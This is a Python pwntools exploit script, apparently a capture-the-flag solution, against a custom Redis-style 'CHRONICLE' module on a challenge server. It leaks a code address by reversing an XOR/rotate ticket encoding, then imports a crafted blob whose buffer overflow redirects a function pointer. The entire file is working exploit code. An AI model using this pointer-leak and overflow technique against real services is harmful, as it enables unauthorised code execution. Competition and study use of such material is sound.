from pwn import *

MASK = (1 << 64) - 1
GOLDEN = 0x9E3779B97F4A7C15
DELTA = 0xD0        # materialize_anchor - commit_annotation
DELAY = 1000

io = remote('chal.thjcc.org', 6379)


def read():
    line = io.recvline()
    tag, body = line[:1], line[1:-2]
    if tag == b'-':
        error(body.decode())
    if tag == b':':
        return int(body)
    if tag == b'$':
        return io.recvn(int(body) + 2)[:-2]
    if tag == b'*':
        return [read() for _ in range(int(body))]
    return body


def cmd(*args):
    args = [a if isinstance(a, bytes) else str(a).encode() for a in args]
    io.send(b'*%d\r\n' % len(args) + b''.join(b'$%d\r\n%s\r\n' % (len(a), a) for a in args))
    return read()


def fnv1a32(data):
    h = 2166136261
    for b in data:
        h = ((h ^ b) * 16777619) & 0xFFFFFFFF
    return h


# ticket = completion ^ rotl64(id * GOLDEN, 17)
tid = cmd('CHRONICLE.NEW', 86400000, 'probe', 'leak')
ticket = cmd('CHRONICLE.SHOW', tid)[3] & MASK
salt = (tid * GOLDEN) & MASK
commit = ticket ^ (((salt << 17) | (salt >> 47)) & MASK)
log.success(f'commit_annotation = {commit:#x}')

payload = b'A' * 80 + p64(commit + DELTA) + b'B' * (256 - 88)
blob = b'CHRN' + bytes([1, 1, 0, 0]) + p32(DELAY) + bytes([0]) + b'\x80\x02' + payload
tid = cmd('CHRONICLE.IMPORT', blob + p32(fnv1a32(blob)))

time.sleep(DELAY / 1000 + 0.5)
log.success(cmd('CHRONICLE.SHOW', tid)[5].decode())
